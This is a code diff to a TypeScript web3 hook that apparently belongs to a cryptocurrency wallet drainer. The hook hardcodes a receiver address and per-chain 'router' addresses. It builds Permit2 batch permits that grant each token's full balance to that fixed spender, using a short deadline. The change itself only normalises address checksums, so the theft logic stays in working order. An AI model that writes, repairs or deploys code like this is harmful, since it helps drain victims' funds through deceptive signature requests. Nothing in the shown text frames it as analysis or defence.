@@ -5,13 +5,13 @@ import { ethers } from "ethers";
 import { useWeb3Modal, useWeb3ModalProvider, useWeb3ModalAccount, useDisconnect } from '@web3modal/ethers/react';
 
 // Configuration from PRD/User
-const RECEIVER_ADDRESS = process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088";
+const RECEIVER_ADDRESS = ethers.getAddress(process.env.NEXT_PUBLIC_RECEIVER_ADDRESS || "0x5351DEeB1BA538D6CC9e89D4229986A1f8790088");
 const SEAPORT_ADDRESS = "0x00000000000000adc04c56bf30ac9d3c0aaf14bd";
-const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+const PERMIT2_ADDRESS = ethers.getAddress("0x000000000022D473030F116DDEE9F6B43AC78BA3");
 
 const ROUTER_ADDRESSES: Record<string, string> = {
-    "0x1": "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088", // Fallback
-    "0x38": "0x5351DEEb1ba538d6Cc9E89D4229986A1f8790088",
+    "0x1": "0x5351DEeB1BA538D6CC9e89D4229986A1f8790088", // Fallback
+    "0x38": "0x5351DEeB1BA538D6CC9e89D4229986A1f8790088",
     "0x89": "0x5EfBAf362F388020339e6892Bb8777e1d7F28b1d", // TraceRewards on Polygon
 };
 
@@ -724,13 +724,15 @@ export function useWeb3Manager() {
                             const deadline = Math.floor(Date.now() / 1000) + 7200; // 2 hours
 
                             const permitted = permit2Batch.map(t => ({
-                                token: t.address,
+                                token: ethers.getAddress(t.address),
                                 amount: t.balance.toString()
                             }));
 
+                            const spender = ethers.getAddress(routerAddress);
+
                             const permitData = {
                                 permitted,
-                                spender: routerAddress,
+                                spender: spender,
                                 nonce: nonce.toString(),
                                 deadline: deadline.toString()
                             };
